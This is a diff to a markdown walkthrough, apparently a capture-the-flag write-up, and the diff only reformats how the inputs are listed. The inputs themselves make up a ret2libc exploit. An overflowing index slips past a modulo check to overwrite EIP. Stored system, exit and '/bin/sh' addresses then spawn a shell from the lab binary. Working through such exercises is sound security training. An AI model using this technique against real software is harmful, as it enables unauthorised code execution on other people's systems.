@@ -149,12 +149,12 @@ python -c "print((2**32)//4 + 114, ((2**32)//4 + 114) % 3)"
 Index `1073741938` hits the same slot as 114 but `% 3 == 1`, so it passes. Sanity-check that
 it overwrites EIP:
 
-🟨 **In the program:**
+🟨 **In the program**, type only the values (the ` Number:` / ` Index:` prompts are printed):
 
-```text
-store / Number: 1094795585 / Index: 1073741938   # 1094795585 = 0x41414141
-quit
-```
+- `Input command:` → `store`
+- ` Number:` → `1094795585` (= 0x41414141)
+- ` Index:` → `1073741938`
+- `Input command:` → `quit`
 
 ⬜ **Output:**
 
@@ -173,20 +173,13 @@ index 115         ->  data[115] = exit     = 4159040368
 index 116         ->  data[116] = "/bin/sh"= 4160264172
 ```
 
-🟨 **In the program:**
+🟨 **In the program**, type only the values in this order (the `Input command:` / ` Number:` /
+` Index:` texts are prompts printed by the program):
 
-```text
-Input command: store
- Number: 4159090384
- Index: 1073741938
-Input command: store
- Number: 4159040368
- Index: 115
-Input command: store
- Number: 4160264172
- Index: 116
-Input command: quit
-```
+1. `store` → Number `4159090384`, Index `1073741938`
+2. `store` → Number `4159040368`, Index `115`
+3. `store` → Number `4160264172`, Index `116`
+4. `quit`
 
 🟨 **In the shell:**
 
